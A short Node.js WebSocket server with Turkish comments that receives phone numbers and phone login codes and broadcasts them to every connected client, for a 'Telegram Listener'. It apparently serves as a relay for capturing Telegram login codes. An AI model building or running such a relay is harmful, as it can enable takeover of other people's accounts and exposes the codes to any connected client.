const WebSocket = require("ws");

const PORT = process.env.PORT || 8765; // Render Cloud'un atadığı portu kullanın
const wss = new WebSocket.Server({ port: PORT });
console.log(`WebSocket sunucusu ${PORT} portunda çalışıyor.`);


wss.on("connection", function connection(ws) {
  console.log("WebSocket bağlantısı kuruldu.");

  ws.on("message", function incoming(message) {
    const data = JSON.parse(message);

    if (data.action === "send_phone") {
      console.log("Telefon numarası alındı:", data.phone);
      // Telegram Listener'a telefon numarasını ilet
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({ action: "phone_received", phone: data.phone }));
        }
      });
    }

    if (data.action === "send_code") {
      console.log("Telefon kodu alındı:", data.code);
      // Telegram Listener'a kodu ilet
      wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({ action: "code_received", code: data.code }));
        }
      });
    }
  });
});

console.log("WebSocket sunucusu   portunda çalışıyor.");